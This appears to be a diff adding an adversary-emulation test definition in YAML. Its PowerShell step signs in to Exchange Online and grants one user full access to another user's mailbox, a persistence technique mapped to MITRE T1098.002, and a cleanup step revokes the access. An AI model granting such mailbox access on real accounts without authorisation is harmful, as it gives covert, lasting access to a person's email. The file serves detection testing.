@@ -1,0 +1,49 @@
+api_version: "2.0"
+name: EXO - Full access mailbox permission granted to a user
+description: |
+    Give a nominated user, full mailbox delegation access of another user.
+    This can be used by an adversary to maintain persistent access to a target's mailbox in M365.
+args:
+    - name: delegate_target
+      type: string
+      default: delegate@contoso.com
+    - name: operator_mailbox
+      type: string
+      default: operator@contoso.com
+    - name: username
+      type: string
+      default: o365_user_test@contoso.com
+    - name: password
+      type: string
+      default: o365_password_test
+uuid: 17d046be-fdd0-4cbb-b5c7-55c85d9d0714
+mitre:
+    tactics:
+        - 'TA0003: Persistence'
+        - 'TA0004: Privilege Escalation'
+    techniques:
+        - 'T1098: Account Manipulation'
+    subtechniques:
+        - 'T1098.002: Additional Email Delegate Permissions'
+requirements:
+    platforms:
+        - os: office-365
+steps:
+    - name: exo---full-access-mailbox-permission-granted-to-a-user
+      inline: |
+        Import-Module ExchangeOnlineManagement
+        $secure_pwd = "{{.Args.password}}" | ConvertTo-SecureString -AsPlainText -Force
+        $creds = New-Object System.Management.Automation.PSCredential -ArgumentList "{{.Args.username}}", $secure_pwd
+        Connect-ExchangeOnline -Credential $creds
+        Add-MailboxPermission -Identity "{{.Args.delegate_target}}" -User "{{.Args.operator_mailbox}}" -AccessRights FullAccess -InheritanceType All
+        Disconnect-ExchangeOnline -Confirm:$false
+      executor: powershell
+      cleanup:
+        inline: |
+            Import-Module ExchangeOnlineManagement
+            $secure_pwd = "{{.Args.password}}" | ConvertTo-SecureString -AsPlainText -Force
+            $creds = New-Object System.Management.Automation.PSCredential -ArgumentList "{{.Args.username}}", $secure_pwd
+            Connect-ExchangeOnline -Credential $creds
+            Remove-MailboxPermission -Identity "{{.Args.delegate_target}}" -User "{{.Args.operator_mailbox}}" -AccessRights FullAccess -InheritanceType All -Confirm:$false
+            Disconnect-ExchangeOnline -Confirm:$false
+        executor: powershell
